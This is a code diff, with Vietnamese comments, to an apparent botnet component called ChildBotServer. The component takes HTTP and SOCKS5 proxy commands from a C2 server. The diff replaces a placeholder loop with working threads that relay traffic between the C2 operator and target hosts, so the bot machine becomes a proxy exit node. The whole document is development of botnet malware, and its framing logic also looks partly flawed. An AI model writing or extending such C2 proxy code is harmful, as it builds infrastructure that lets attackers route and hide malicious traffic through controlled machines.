@@ -173,7 +173,7 @@ class ChildBotServer:
         self.stats['last_heartbeat'] = datetime.now()
         
     def handle_proxy_request(self, command):
-        """Xử lý HTTP proxy request"""
+        """Xử lý HTTP proxy request (framed protocol)"""
         try:
             parts = command.split(":")
             if len(parts) >= 5:
@@ -187,11 +187,14 @@ class ChildBotServer:
                 # Tạo connection đến target
                 self.create_proxy_connection(connection_id, target_host, target_port, is_https, False)
                 
+                # Bắt đầu luồng target->C2
+                threading.Thread(target=self.pump_target_to_c2, args=(connection_id,), daemon=True).start()
+                
         except Exception as e:
             print(f"❌ Error handling proxy request: {e}")
             
     def handle_socks_request(self, command):
-        """Xử lý SOCKS5 proxy request"""
+        """Xử lý SOCKS5 proxy request (framed protocol)"""
         try:
             parts = command.split(":")
             if len(parts) >= 4:
@@ -203,6 +206,9 @@ class ChildBotServer:
                 
                 # Tạo connection đến target
                 self.create_proxy_connection(connection_id, target_host, target_port, False, True)
+                
+                # Bắt đầu luồng target->C2
+                threading.Thread(target=self.pump_target_to_c2, args=(connection_id,), daemon=True).start()
                 
         except Exception as e:
             print(f"❌ Error handling SOCKS request: {e}")
@@ -247,30 +253,65 @@ class ChildBotServer:
             self.c2_socket.send(error_msg.encode())
             
     def start_proxy_forwarding(self, connection_id):
-        """Bắt đầu proxy forwarding"""
-        def forward_data():
-            try:
-                connection = self.active_connections[connection_id]
-                target_socket = connection['target_socket']
-                
-                # Đọc data từ C2 server và forward đến target
-                while connection_id in self.active_connections:
+        """Bắt đầu proxy forwarding (C2->Target via DATA frames)"""
+        threading.Thread(target=self.pump_c2_to_target, args=(connection_id,), daemon=True).start()
+
+    def pump_c2_to_target(self, connection_id):
+        """Nhận DATA frames từ C2 và bơm vào target socket."""
+        try:
+            if not self.connected_to_c2 or connection_id not in self.active_connections:
+                return
+            target_socket = self.active_connections[connection_id]['target_socket']
+            buffer = b""
+            while True:
+                chunk = self.c2_socket.recv(4096)
+                if not chunk:
+                    break
+                buffer += chunk
+                while b"\n" in buffer:
+                    line, _, buffer = buffer.partition(b"\n")
+                    header = line.decode(errors='ignore')
+                    if header.startswith("DATA:"):
+                        parts = header.split(":")
+                        if len(parts) < 3:
+                            continue
+                        cid = parts[1]
+                        if cid != connection_id:
+                            continue
+                        # Write whatever currently buffered to target
+                        if buffer:
+                            try:
+                                target_socket.sendall(buffer)
+                            except Exception:
+                                pass
+                            buffer = b""
+                    elif header.startswith("END:"):
+                        parts = header.split(":")
+                        if len(parts) >= 2 and parts[1] == connection_id:
+                            return
+        except Exception as e:
+            print(f"❌ pump C2->target error {connection_id}: {e}")
+
+    def pump_target_to_c2(self, connection_id):
+        """Đọc từ target và gửi RESP frames về C2."""
+        try:
+            if not self.connected_to_c2 or connection_id not in self.active_connections:
+                return
+            target_socket = self.active_connections[connection_id]['target_socket']
+            while True:
+                data = target_socket.recv(4096)
+                if not data:
                     try:
-                        # Đọc data từ C2 (sẽ được gửi qua separate channel)
-                        # Ở đây chúng ta sẽ implement data forwarding logic
-                        time.sleep(0.1)  # Placeholder
-                        
-                    except Exception as e:
-                        print(f"❌ Error in proxy forwarding: {e}")
-                        break
-                        
-            except Exception as e:
-                print(f"❌ Error in proxy forwarding thread: {e}")
-            finally:
-                self.close_connection(connection_id)
-                
-        # Start forwarding thread
-        threading.Thread(target=forward_data, daemon=True).start()
+                        self.c2_socket.sendall(f"END:{connection_id}\n".encode())
+                    except Exception:
+                        pass
+                    break
+                try:
+                    self.c2_socket.sendall(f"RESP:{connection_id}:\n".encode() + data)
+                except Exception:
+                    break
+        except Exception as e:
+            print(f"❌ pump target->C2 error {connection_id}: {e}")
         
     def close_connection(self, connection_id):
         """Đóng proxy connection"""
